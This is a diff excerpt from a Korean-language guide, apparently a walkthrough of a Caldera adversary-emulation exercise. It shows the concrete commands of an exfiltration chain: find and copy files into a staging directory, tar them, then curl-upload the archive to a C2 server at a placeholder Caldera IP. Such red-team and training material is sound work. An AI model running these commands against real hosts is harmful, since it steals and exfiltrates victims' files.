@@ -61,7 +61,29 @@ tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.stag
 # plugins.stockpile.app.requirements.paw_provenance
 curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
 ```
+
 - 위와 같은 Chain이 Victim host를 대상으로 실행됩니다.
+  - 각각의 Abilities에서 적용될 변수들은 `Configuration/Fact Sources`에서 확인할 수 있습니다.
+
+```bash
+mkdir -p staged && echo $PWD/staged
+find / -name '*.png' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
+find / -name '*.yml' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
+find / -name '*.wav' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
+cp /usr/lib/python3/dist-packages/mpl_toolkits/tests/baseline_images/test_axisartist_axislines/Subplot.png /home/biz-jeongwon/staged
+cp /Docker/host/tile-icon.png /home/biz-jeongwon/staged
+cp /Docker/host/tile-error.png /home/biz-jeongwon/staged
+tar -P -zcf /home/biz-jeongwon/staged.tar.gz /home/biz-jeongwon/staged && echo /home/biz-jeongwon/staged.tar.gz
+curl -F "data=@/home/biz-jeongwon/staged.tar.gz" --header "X-Request-ID: `hostname`-antixm" http://[Caldera Server IP]:8888/file/upload
+```
+
+- 실제 실행되는 Attack Chain의 Command line입니다.
+  - Victim host에 staging directory를 생성하고, sensitive file을 해당 directory에 옮긴 후, 압축하여 C2 server(Caldera server)로 curl을 통해 보냅니다.
+ 
+
+
+
+
 
 
  
